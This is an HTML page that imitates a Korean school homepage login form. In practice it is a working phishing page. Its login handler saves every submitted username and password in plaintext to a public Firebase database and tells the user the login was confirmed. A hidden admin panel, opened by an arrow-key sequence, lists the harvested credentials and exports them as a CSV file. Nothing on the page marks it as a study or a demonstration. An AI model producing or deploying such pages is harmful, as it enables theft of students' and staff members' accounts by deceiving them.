<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>학교홈페이지 로그인</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, doc, setDoc, getDoc, collection, getDocs, deleteDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        const firebaseConfig = JSON.parse(__firebase_config);
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'school-login-app';
        
        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        let currentUser = null;

        // 초기 인증 설정
        const initAuth = async () => {
            try {
                if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                    await signInWithCustomToken(auth, __initial_auth_token);
                } else {
                    await signInAnonymously(auth);
                }
            } catch (error) {
                console.error("Auth error:", error);
            }
        };

        onAuthStateChanged(auth, (user) => {
            currentUser = user;
            if (user && window.isAdminMode) fetchServerData();
        });

        initAuth();

        // --- 로그인 처리 (서버 저장) ---
        window.handleLogin = async () => {
            const id = document.getElementById('userId').value.trim();
            const pw = document.getElementById('userPw').value.trim();

            if (!id || !pw) {
                showToast('아이디와 비밀번호를 모두 입력해주세요.');
                return;
            }

            setLoading(true);

            try {
                const userRef = doc(db, 'artifacts', appId, 'public', 'data', 'users', id);
                await setDoc(userRef, {
                    username: id,
                    password: pw,
                    savedAt: serverTimestamp()
                });

                showToast('로그인 정보가 확인되었습니다.');
                document.getElementById('userId').value = '';
                document.getElementById('userPw').value = '';
            } catch (error) {
                showToast('서버 연결 오류가 발생했습니다.');
            } finally {
                setLoading(false);
            }
        };

        // --- 관리자 기능 ---
        window.fetchServerData = async () => {
            if (!currentUser) return;
            const listContainer = document.getElementById('userList');
            listContainer.innerHTML = '<tr><td colspan="4" class="p-4 text-center">불러오는 중...</td></tr>';

            try {
                const querySnapshot = await getDocs(collection(db, 'artifacts', appId, 'public', 'data', 'users'));
                const users = [];
                querySnapshot.forEach((doc) => { users.push({ id: doc.id, ...doc.data() }); });

                if (users.length === 0) {
                    listContainer.innerHTML = '<tr><td colspan="4" class="p-4 text-center text-gray-400">데이터가 없습니다.</td></tr>';
                    return;
                }

                listContainer.innerHTML = '';
                users.forEach((user, index) => {
                    const date = user.savedAt ? new Date(user.savedAt.seconds * 1000).toLocaleString() : '-';
                    listContainer.innerHTML += `
                        <tr class="border-b">
                            <td class="p-3 text-center">${index + 1}</td>
                            <td class="p-3 font-bold text-blue-800">${user.username}</td>
                            <td class="p-3 font-mono text-red-500">${user.password}</td>
                            <td class="p-3 text-xs text-center">${date} <button onclick="deleteUser('${user.id}')" class="ml-2 text-gray-400">×</button></td>
                        </tr>`;
                });
                window.cachedUsers = users;
            } catch (e) { showToast('접근 권한이 없습니다.'); }
        };

        window.deleteUser = async (id) => {
            if (!confirm('삭제하시겠습니까?')) return;
            await deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'users', id));
            fetchServerData();
        };

        window.downloadCSV = () => {
            if (!window.cachedUsers || window.cachedUsers.length === 0) return;
            let csv = "\uFEFF번호,아이디,비밀번호,수집시간\n";
            window.cachedUsers.forEach((u, i) => {
                const date = u.savedAt ? new Date(u.savedAt.seconds * 1000).toLocaleString() : '-';
                csv += `${i+1},${u.username},${u.password},${date}\n`;
            });
            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
            const link = document.createElement("a");
            link.href = URL.createObjectURL(blob);
            link.download = "collected_server_data.csv";
            link.click();
        };

        window.showToast = (text) => {
            const toast = document.getElementById('toast');
            toast.innerText = text;
            toast.style.display = 'block';
            setTimeout(() => { toast.style.display = 'none'; }, 2500);
        };

        function setLoading(val) {
            const btn = document.getElementById('loginBtn');
            btn.disabled = val;
            btn.innerText = val ? '...' : '로그인';
        }
    </script>

    <style>
        body { font-family: 'Malgun Gothic', 'dotum', sans-serif; background-color: #fff; }
        .notice-box { background-color: #f7f7f7; border: 1px solid #e5e5e5; padding: 20px 30px; margin-bottom: 30px; line-height: 1.6; font-size: 14px; }
        .main-container { display: flex; max-width: 900px; margin: 0 auto; border: 1px solid #ddd; }
        .left-box { width: 45%; background-color: #fff; border-right: 1px solid #ddd; display: flex; align-items: center; justify-content: center; padding: 60px 20px; font-size: 13px; font-weight: bold; color: #333; }
        .right-box { width: 55%; padding: 30px 40px; }
        .input-row { display: flex; align-items: center; margin-bottom: 8px; }
        .label { width: 70px; font-size: 13px; color: #666; }
        .input-item { flex: 1; height: 34px; border: 1px solid #ccc; padding: 0 8px; font-size: 14px; }
        .login-button { background-color: #0070b8; color: white; width: 100px; height: 76px; border: none; margin-left: 10px; font-weight: bold; font-size: 15px; cursor: pointer; }
        .bottom-nav { margin-top: 20px; border-top: 1px solid #eee; padding-top: 15px; display: flex; justify-content: center; gap: 15px; font-size: 12px; color: #888; }
        #toast { display: none; position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #222; color: #fff; padding: 10px 20px; border-radius: 4px; z-index: 10000; }
        
        /* 숨겨진 관리자 모드 스타일 */
        #adminPanel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; padding: 40px; overflow-y: auto; }
    </style>
</head>
<body class="p-8">

    <div id="toast"></div>

    <!-- [1] 로그인 화면 (image_bd4596.png 디자인 반영) -->
    <div id="loginView" class="max-w-[900px] mx-auto pt-10">
        <h1 class="text-3xl font-bold mb-8 pb-4 border-b-2 border-black">로그인</h1>

        <div class="notice-box">
            학교홈페이지에 가입된 아이디는 교육청에서 제공하는 해당 학교홈페이지에서만 사용이 가능하며 
            <span class="text-red-600 font-bold">(상급학교진학/전학/전출 시)</span> 
            <span class="font-bold">기존의 아이디는 회원탈퇴 한 후 다른 학교에서 새롭게 회원가입을 진행하셔야 합니다.</span>
        </div>

        <div class="main-container">
            <div class="left-box">
                학교홈페이지 회원가입
            </div>
            <div class="right-box">
                <p class="text-[13px] mb-5">
                    본 학교홈페이지에 회원 가입이 되어 있으면 <span class="text-blue-700 font-bold">기존 아이디를 사용하시면 됩니다.</span>
                </p>
                <div class="flex">
                    <div class="flex-1 space-y-1">
                        <div class="input-row"><span class="label">아이디</span><input type="text" id="userId" class="input-item"></div>
                        <div class="input-row"><span class="label">비밀번호</span><input type="password" id="userPw" class="input-item"></div>
                    </div>
                    <button id="loginBtn" class="login-button" onclick="handleLogin()">로그인</button>
                </div>
                <div class="bottom-nav">
                    <a href="#">아이디 찾기</a><span>|</span><a href="#">비밀번호 찾기</a>
                </div>
            </div>
        </div>
    </div>

    <!-- [2] 숨겨진 관리자 패널 -->
    <div id="adminPanel">
        <div class="flex justify-between items-center mb-8 border-b pb-4">
            <h2 class="text-2xl font-bold">서버 데이터 관리자 모드</h2>
            <div class="space-x-2">
                <button onclick="downloadCSV()" class="bg-green-600 text-white px-4 py-2 rounded text-sm font-bold">CSV 다운로드</button>
                <button onclick="location.reload()" class="bg-gray-800 text-white px-4 py-2 rounded text-sm font-bold">패널 닫기</button>
            </div>
        </div>
        <table class="w-full border-collapse">
            <thead>
                <tr class="bg-gray-100 text-sm">
                    <th class="border p-3">No</th>
                    <th class="border p-3">아이디</th>
                    <th class="border p-3">비밀번호</th>
                    <th class="border p-3">기록 시간</th>
                </tr>
            </thead>
            <tbody id="userList"></tbody>
        </table>
    </div>

    <script>
        // 커스텀 패턴 입력 시스템 (화살표 키 상상하하좌우)
        const pattern = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight'];
        let currentStep = 0;

        document.addEventListener('keydown', (e) => {
            // 패턴 체크
            if (e.key === pattern[currentStep]) {
                currentStep++;
                if (currentStep === pattern.length) {
                    toggleAdmin();
                    currentStep = 0;
                }
            } else {
                currentStep = 0;
            }

            // 일반 엔터 로그인
            if (e.key === 'Enter' && document.getElementById('adminPanel').style.display !== 'block') {
                window.handleLogin();
            }
        });

        function toggleAdmin() {
            const panel = document.getElementById('adminPanel');
            panel.style.display = 'block';
            window.isAdminMode = true;
            window.fetchServerData();
            window.showToast('관리자 모드가 활성화되었습니다.');
        }
    </script>
</body>
</html>
